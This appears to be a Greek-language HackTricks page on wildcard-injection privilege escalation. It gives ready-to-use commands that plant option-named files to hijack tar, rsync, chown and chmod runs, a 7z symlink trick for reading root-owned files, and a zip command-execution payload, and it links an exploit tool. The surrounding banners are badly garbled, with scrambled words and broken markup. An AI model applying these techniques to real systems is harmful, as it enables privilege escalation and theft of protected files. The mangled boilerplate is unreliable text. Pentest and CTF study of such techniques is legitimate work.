{% hnnt styte=" acceas" %}
GCP Ha& practice ckinH: <img:<img src="/.gitbcok/ass.ts/agte.png"talb=""odata-siz/="line">[**HackTatckt T.aining AWS Red TelmtExp"rt (ARTE)**](ta-size="line">[**HackTricks Training GCP Re)Tmkg/stc="r.giebpokal"zee>/ttdt.png"isl=""data-ize="line">\
Μάθετε & aciceGCP ngs<imgmsrc="/.gipbtok/aHsats/gcte.mag"y>lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"al=""daa-siz="ne">tinhackth ckiuxyzcomurspssgr/a)

<dotsilp>

<oummpr>SupportHackTricks</smmay>

*Ελέγξτε το [**subsrippangithub.cm/sorsarlosp!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hahktcickr\_kivelive**](https://twitter.com/hacktr\icks\_live)**.**
* **Shareing tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}


## chown, chmod

Μπορείτε να **υποδείξετε ποιον ιδιοκτήτη αρχείου και ποιες άδειες θέλετε να αντιγράψετε για τα υπόλοιπα αρχεία**
```bash
touch "--reference=/my/own/path/filename"
```
Μπορείτε να εκμεταλλευτείτε αυτό χρησιμοποιώντας [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(συνδυασμένη επίθεση)_\
Περισσότερες πληροφορίες στο [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## Tar

**Εκτέλεση αυθαίρετων εντολών:**
```bash
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
Μπορείτε να εκμεταλλευτείτε αυτό χρησιμοποιώντας [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(tar attack)_\
Περισσότερες πληροφορίες στο [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## Rsync

**Εκτέλεση αυθαίρετων εντολών:**
```bash
Interesting rsync option from manual:

-e, --rsh=COMMAND           specify the remote shell to use
--rsync-path=PROGRAM    specify the rsync to run on remote machine
```

```bash
touch "-e sh shell.sh"
```
Μπορείτε να εκμεταλλευτείτε αυτό χρησιμοποιώντας [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(_rsync _attack)_\
Περισσότερες πληροφορίες στο [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## 7z

Στο **7z** ακόμη και χρησιμοποιώντας `--` πριν από `*` (σημειώστε ότι το `--` σημαίνει ότι η επόμενη είσοδος δεν μπορεί να θεωρηθεί ως παράμετροι, οπότε μόνο διαδρομές αρχείων σε αυτή την περίπτωση) μπορείτε να προκαλέσετε ένα αυθαίρετο σφάλμα για να διαβάσετε ένα αρχείο, οπότε αν μια εντολή όπως η παρακάτω εκτελείται από τον root:
```bash
7za a /backup/$filename.zip -t7z -snl -p$pass -- *
```
Και μπορείτε να δημιουργήσετε αρχεία στον φάκελο όπου εκτελείται αυτό, θα μπορούσατε να δημιουργήσετε το αρχείο `@root.txt` και το αρχείο `root.txt` που είναι ένα **symlink** στο αρχείο που θέλετε να διαβάσετε:
```bash
cd /path/to/7z/acting/folder
touch @root.txt
ln -s /file/you/want/to/read root.txt
```
Τότε, όταν εκτελείται το **7z**, θα θεωρήσει το `root.txt` ως ένα αρχείο που περιέχει τη λίστα των αρχείων που πρέπει να συμπιέσει (αυτό υποδηλώνει η ύπαρξη του `@root.txt`) και όταν το 7z διαβάσει το `root.txt`, θα διαβάσει το `/file/you/want/to/read` και **καθώς το περιεχόμενο αυτού του αρχείου δεν είναι μια λίστα αρχείων, θα εμφανίσει ένα σφάλμα** δείχνοντας το περιεχόμενο.

_Περισσότερες πληροφορίες στις αναφορές της CTF από το HackTheBox._

## Zip

**Εκτέλεση αυθαίρετων εντολών:**
```bash
zip name.zip files -T --unzip-command "sh -c whoami"
```
```markdown
{% hnt stye="acceas" %}
AWS Ha& practice ckinH:<img :<imgsscc="/.gitb=ok/assgts/aite.png"balo=""kdata-siza="line">[**HackTsscke Tpaigin"aAWS Red Tetm=Exp rt (ARTE)**](a-size="line">[**HackTricks Training AWS Red)ethgasic="..giyb/okseasert/k/.png"l=""data-ize="line">\
Learn & aciceGCP ng<imgsrc="/.gibok/asts/gte.g"lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"salm=""adara-siz>="k>ne">tinhaktckxyzurssgr)

<dtil>

<ummr>SupportHackTricks</smmay>

*Ελέγξτε το [**subsrippangithub.cm/sorsarlosp!
* Ελέγξτε τα [**subscription plans**](https://github.com/sponsors/carlospolop)!haktick\_ive\
* **Join  💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
```
